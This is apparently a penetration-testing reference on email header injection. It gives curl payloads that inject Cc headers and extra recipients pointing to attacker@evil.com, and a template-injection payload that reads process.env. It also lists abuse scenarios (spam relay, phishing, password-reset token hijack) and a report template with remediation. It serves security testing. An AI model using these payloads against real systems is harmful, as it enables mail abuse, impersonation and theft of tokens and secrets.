# testing-for-email-header-injection — 详细参考（由 SKILL.md 拆分）

# JSON API header injection
curl -X POST http://target.com/api/send-email \
  -H "Content-Type: application/json" \
  -d '{"to":"test@test.com\nCc:attacker@evil.com","subject":"Test","body":"Test"}'

# Array injection for multiple recipients
curl -X POST http://target.com/api/send-email \
  -H "Content-Type: application/json" \
  -d '{"to":["test@test.com","attacker@evil.com"],"subject":"Test","body":"Test"}'

# Template injection in email body
curl -X POST http://target.com/api/send-email \
  -H "Content-Type: application/json" \
  -d '{"to":"test@test.com","subject":"Test","body":"{{constructor.constructor(\"return process.env\")()}}"}'
```

### Step 6 — Validate Findings
```bash
# Check if injected CC/BCC emails were received
# Monitor attacker@evil.com inbox for received copies

# Verify header injection via email raw source
# In received email, check "View Original" or "Show Headers"
# Look for injected Cc:, Bcc:, From:, or Reply-To: headers

# Test if the application is usable as a spam relay
# by injecting multiple recipients in BCC

# Document the full injection chain
# 1. Injection point (which field)
# 2. Encoding required (CRLF, URL encoding)
# 3. Impact (spam relay, phishing, data theft)
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| CRLF Injection | Injecting carriage return and line feed characters to create new email headers |
| Header Injection | Adding unauthorized headers (Cc, Bcc, From) to outgoing emails |
| Spam Relay | Abusing email functionality to send spam to arbitrary recipients |
| Email Spoofing | Modifying From or Reply-To headers to impersonate trusted senders |
| MIME Manipulation | Injecting MIME boundaries to override email body content |
| SMTP Command Injection | Injecting raw SMTP commands through unsanitized email parameters |
| Newline Characters | \r\n (CRLF), \n (LF), \r (CR) used to separate email headers |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy for modifying email-related form submissions |
| swaks | Swiss Army Knife for SMTP testing and header injection validation |
| OWASP ZAP | Automated scanner with email injection detection |
| mailhog | Local SMTP testing server for capturing injected emails |
| smtp4dev | Development SMTP server for monitoring email injection results |
| Nuclei | Template scanner with email header injection detection templates |

## Common Scenarios

1. **Spam Relay** — Inject BCC headers to relay mass emails through the target's SMTP server, bypassing spam filters that trust the sender domain
2. **Phishing via Contact Form** — Modify From and Reply-To headers to send phishing emails appearing to originate from the target organization
3. **Password Reset Hijack** — Inject CC header in password reset flow to receive a copy of reset tokens sent to the victim
4. **Email Content Override** — Inject MIME Content-Type headers to replace legitimate email body with malicious phishing content
5. **Internal Email Abuse** — Use header injection to send emails to internal addresses not normally accessible through the application

## Output Format

```
## Email Header Injection Report
- **Target**: http://target.com/contact
- **Injection Point**: email field in contact form
- **Encoding Required**: URL-encoded LF (%0A)

### Findings
| # | Field | Payload | Result | Severity |
|---|-------|---------|--------|----------|
| 1 | email | test@test.com%0ACc:evil@evil.com | CC header injected | High |
| 2 | email | test@test.com%0ABcc:evil@evil.com | BCC header injected | High |
| 3 | name | Test%0AFrom:ceo@target.com | From spoofing | Medium |

### Remediation
- Validate email addresses with strict regex rejecting newline characters
- Strip \r, \n, and encoded variants from all email-related input
- Use parameterized email APIs that separate headers from data
- Implement rate limiting on email-sending functionality
```
